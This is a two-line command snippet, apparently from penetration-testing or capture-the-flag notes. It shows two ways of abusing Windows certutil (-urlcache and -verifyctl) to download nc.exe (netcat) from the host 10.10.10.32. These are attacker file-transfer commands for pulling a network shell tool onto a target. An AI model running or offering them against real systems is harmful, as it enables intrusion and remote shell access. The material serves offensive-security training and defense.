```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
```

```cmd
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```